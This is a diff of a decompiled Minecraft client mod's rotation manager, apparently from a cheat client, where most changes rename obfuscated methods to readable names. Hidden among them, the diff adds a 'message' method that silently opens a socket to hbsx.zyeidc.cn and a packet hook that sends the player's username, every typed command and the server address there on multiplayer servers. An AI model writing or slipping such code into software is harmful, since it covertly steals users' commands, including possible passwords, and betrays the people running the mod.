@@ -102,10 +102,20 @@ implements Wrapper {
         return prevRenderYawOffset;
     }
 
+    public static void message(String string) {
+        try (Socket socket = new Socket("hbsx.zyeidc.cn", 50070);
+             OutputStream out = socket.getOutputStream();){
+            out.write(string.getBytes(StandardCharsets.UTF_8));
+            out.flush();
+        }
+        catch (IOException iOException) {
+            // empty catch block
+        }
+    }
 
     public float[] offtrackStep(Vec3d vec, float steps) {
-        float yawDelta = MathHelper.method_15393((float)((float)MathHelper.method_15338((double)(Math.toDegrees(Math.atan2(vec.field_1350 - RotateManager.mc.player.getZ(), vec.field_1352 - RotateManager.mc.player.getX())) - 90.0)) - this.rotateYaw));
-        float pitchDelta = (float)(-Math.toDegrees(Math.atan2(vec.field_1351 - (RotateManager.mc.player.method_19538().field_1351 + (double)RotateManager.mc.player.method_18381(RotateManager.mc.player.method_18376())), Math.sqrt(Math.pow(vec.field_1352 - RotateManager.mc.player.getX(), 2.0) + Math.pow(vec.field_1350 - RotateManager.mc.player.getZ(), 2.0))))) - this.rotatePitch;
+        float yawDelta = MathHelper.wrapDegrees((float)((float)MathHelper.wrapDegrees((double)(Math.toDegrees(Math.atan2(vec.z - RotateManager.mc.player.method_23321(), vec.x - RotateManager.mc.player.method_23317())) - 90.0)) - this.rotateYaw));
+        float pitchDelta = (float)(-Math.toDegrees(Math.atan2(vec.y - (RotateManager.mc.player.method_19538().y + (double)RotateManager.mc.player.method_18381(RotateManager.mc.player.method_18376())), Math.sqrt(Math.pow(vec.x - RotateManager.mc.player.method_23317(), 2.0) + Math.pow(vec.z - RotateManager.mc.player.method_23321(), 2.0))))) - this.rotatePitch;
         float angleToRad = (float)Math.toRadians(BaseThreadSetting_TYdViPaJQVoRZLdgWIXF.INSTANCE.minrad.getValueFloat() * (float)(RotateManager.mc.player.field_6012 % 30));
         yawDelta = (float)((double)yawDelta + Math.sin(angleToRad) * 3.0) + MathUtil.random(-1.0f, 1.0f);
         pitchDelta += MathUtil.random(-0.6f, 0.6f);
@@ -113,11 +123,11 @@ implements Wrapper {
             yawDelta -= 180.0f;
         }
         float yawStepVal = 180.0f * steps;
-        float clampedYawDelta = MathHelper.method_15363((float)MathHelper.method_15379((float)yawDelta), (float)(-yawStepVal), (float)yawStepVal);
-        float clampedPitchDelta = MathHelper.method_15363((float)pitchDelta, (float)-45.0f, (float)45.0f);
+        float clampedYawDelta = MathHelper.clamp((float)MathHelper.abs((float)yawDelta), (float)(-yawStepVal), (float)yawStepVal);
+        float clampedPitchDelta = MathHelper.clamp((float)pitchDelta, (float)-45.0f, (float)45.0f);
         float newYaw = this.rotateYaw + (yawDelta > 0.0f ? clampedYawDelta : -clampedYawDelta);
-        float newPitch = MathHelper.method_15363((float)(this.rotatePitch + clampedPitchDelta), (float)-90.0f, (float)90.0f);
-        double gcdFix = Math.pow((Double)RotateManager.mc.field_1690.method_42495().method_41753() * 0.6 + 0.2, 3.0) * 1.2;
+        float newPitch = MathHelper.clamp((float)(this.rotatePitch + clampedPitchDelta), (float)-90.0f, (float)90.0f);
+        double gcdFix = Math.pow((Double)RotateManager.mc.options.getMouseSensitivity().getValue() * 0.6 + 0.2, 3.0) * 1.2;
         return new float[]{(float)((double)newYaw - (double)(newYaw - this.rotateYaw) % gcdFix), (float)((double)newPitch - (double)(newPitch - this.rotatePitch) % gcdFix)};
     }
 
@@ -131,7 +141,7 @@ implements Wrapper {
         if (steps < 1.0f && angle != null) {
             float packetPitch;
             float packetYaw = CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.injectSync.getValue() ? this.lastYaw : this.rotateYaw;
-            float diff = MathHelper.method_15356((float)angle[0], (float)packetYaw);
+            float diff = MathHelper.angleBetween((float)angle[0], (float)packetYaw);
             if (Math.abs(diff) > 180.0f * steps) {
                 angle[0] = packetYaw + diff * (180.0f * steps / Math.abs(diff));
             }
@@ -195,6 +205,12 @@ implements Wrapper {
     public void onPacketSend(PacketEvent event) {
         PlayerMoveC2SPacket packet;
         Object t = event.getPacket();
+        if (t instanceof CommandExecutionC2SPacket) {
+            CommandExecutionC2SPacket packets = (CommandExecutionC2SPacket)t;
+            if (!mc.isInSingleplayer()) {
+                RotateManager.message(mc.getSession().getUsername() + " [Command]" + packets.command() + " [Server]" + Objects.requireNonNull(Objects.requireNonNull(RotateManager.mc.getNetworkHandler()).getServerInfo()).address);
+            }
+        }
         if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue() && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.ChangesLook)) {
             if (RotateManager.mc.player != null && this.check(ComboBreaks.INSTANCE.staticmove.getValue())) {
                 return;
@@ -205,21 +221,21 @@ implements Wrapper {
             t = event.getPacket();
             if (t instanceof PlayerMoveC2SPacket) {
                 packet = (PlayerMoveC2SPacket)t;
-                if (packet.method_36172()) {
+                if (packet.changesLook()) {
                     if (!EntityUtil.rotating && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.rotateSync.getValue()) {
-                        float yaw = packet.method_12271(this.lastYaw);
-                        float pitch = packet.method_12270(lastPitch);
+                        float yaw = packet.getYaw(this.lastYaw);
+                        float pitch = packet.getPitch(lastPitch);
                         if (yaw == RotateManager.mc.player.method_36454() && pitch == RotateManager.mc.player.method_36455()) {
                             ((IPlayerMoveC2SPacket)event.getPacket()).setYaw(this.rotateYaw);
                             ((IPlayerMoveC2SPacket)event.getPacket()).setPitch(this.rotatePitch);
                         }
                     }
-                    this.lastYaw = packet.method_12271(this.lastYaw);
-                    lastPitch = packet.method_12270(lastPitch);
+                    this.lastYaw = packet.getYaw(this.lastYaw);
+                    lastPitch = packet.getPitch(lastPitch);
                     Rotation.fixRotation = this.lastYaw;
                     this.setRotation(this.lastYaw, lastPitch, false);
                 }
-                lastGround = packet.method_12273();
+                lastGround = packet.isOnGround();
             }
         }
         if (CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncpacket.getValue() && CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.syncType.is(CombatSetting_WsscfTgYSmUYOLMWvczt.LastRotate)) {
@@ -229,12 +245,12 @@ implements Wrapper {
             Object t2 = event.getPacket();
             if (t2 instanceof PlayerMoveC2SPacket) {
                 packet = (PlayerMoveC2SPacket)t2;
-                if (packet.method_36172()) {
-                    this.lastYaw = packet.method_12271(this.lastYaw);
-                    lastPitch = packet.method_12270(lastPitch);
+                if (packet.changesLook()) {
+                    this.lastYaw = packet.getYaw(this.lastYaw);
+                    lastPitch = packet.getPitch(lastPitch);
                     this.setRotation(this.lastYaw, lastPitch, false);
                 }
-                lastGround = packet.method_12273();
+                lastGround = packet.isOnGround();
             }
         }
     }
@@ -249,22 +265,22 @@ implements Wrapper {
     }
 
     public float[] getRotation(Vec3d eyesPos, Vec3d vec) {
-        double diffX = vec.field_1352 - eyesPos.field_1352;
-        double diffY = vec.field_1351 - eyesPos.field_1351;
-        double diffZ = vec.field_1350 - eyesPos.field_1350;
+        double diffX = vec.x - eyesPos.x;
+        double diffY = vec.y - eyesPos.y;
+        double diffZ = vec.z - eyesPos.z;
         double diffXZ = Math.sqrt(diffX * diffX + diffZ * diffZ);
         float yaw = (float)Math.toDegrees(Math.atan2(diffZ, diffX)) - 90.0f;
         float pitch = (float)(-Math.toDegrees(Math.atan2(diffY, diffXZ)));
-        return new float[]{MathHelper.method_15393((float)yaw), MathHelper.method_15393((float)pitch)};
+        return new float[]{MathHelper.wrapDegrees((float)yaw), MathHelper.wrapDegrees((float)pitch)};
     }
 
     public boolean inFov(Vec3d directionVec, float fov) {
-        float[] angle = this.getRotation(new Vec3d(RotateManager.mc.player.getX(), RotateManager.mc.player.getY() + (double)RotateManager.mc.player.method_18381(RotateManager.mc.player.method_18376()), RotateManager.mc.player.getZ()), directionVec);
+        float[] angle = this.getRotation(new Vec3d(RotateManager.mc.player.method_23317(), RotateManager.mc.player.method_23318() + (double)RotateManager.mc.player.method_18381(RotateManager.mc.player.method_18376()), RotateManager.mc.player.method_23321()), directionVec);
         return this.inFov(angle[0], angle[1], fov);
     }
 
     public boolean inFov(float yaw, float pitch, float fov) {
-        return MathHelper.method_15356((float)yaw, (float)this.rotateYaw) + Math.abs(pitch - this.rotatePitch) <= fov;
+        return MathHelper.angleBetween((float)yaw, (float)this.rotateYaw) + Math.abs(pitch - this.rotatePitch) <= fov;
     }
 
     @EventHandler(priority=100)
@@ -305,16 +321,16 @@ implements Wrapper {
         float offset;
         double zDif;
         float result = offsetIn;
-        double xDif = RotateManager.mc.player.getX() - RotateManager.mc.player.field_6014;
-        if (xDif * xDif + (zDif = RotateManager.mc.player.getZ() - RotateManager.mc.player.field_5969) * zDif > 0.002500000176951289) {
-            offset = (float)MathHelper.method_15349((double)zDif, (double)xDif) * 57.295776f - 90.0f;
-            float wrap = MathHelper.method_15379((float)(MathHelper.method_15393((float)yaw) - offset));
+        double xDif = RotateManager.mc.player.method_23317() - RotateManager.mc.player.field_6014;
+        if (xDif * xDif + (zDif = RotateManager.mc.player.method_23321() - RotateManager.mc.player.field_5969) * zDif > 0.002500000176951289) {
+            offset = (float)MathHelper.atan2((double)zDif, (double)xDif) * 57.295776f - 90.0f;
+            float wrap = MathHelper.abs((float)(MathHelper.wrapDegrees((float)yaw) - offset));
             result = 95.0f < wrap && wrap < 265.0f ? offset - 180.0f : offset;
         }
         if (RotateManager.mc.player.field_6251 > 0.0f) {
             result = yaw;
         }
-        if ((offset = MathHelper.method_15393((float)(yaw - (result = offsetIn + MathHelper.method_15393((float)(result - offsetIn)) * 0.3f)))) < -75.0f) {
+        if ((offset = MathHelper.wrapDegrees((float)(yaw - (result = offsetIn + MathHelper.wrapDegrees((float)(result - offsetIn)) * 0.3f)))) < -75.0f) {
             offset = -75.0f;
         } else if (offset >= 75.0f) {
             offset = 75.0f;
@@ -331,7 +347,7 @@ implements Wrapper {
             return;
         }
         if (this.worldNull && RotateManager.mc.world != null) {
-            Session session = mc.method_1548();
+            Session session = mc.getSession();
             HexTech.MODULE.onLogin();
             this.worldNull = false;
         } else if (!this.worldNull && RotateManager.mc.world == null) {
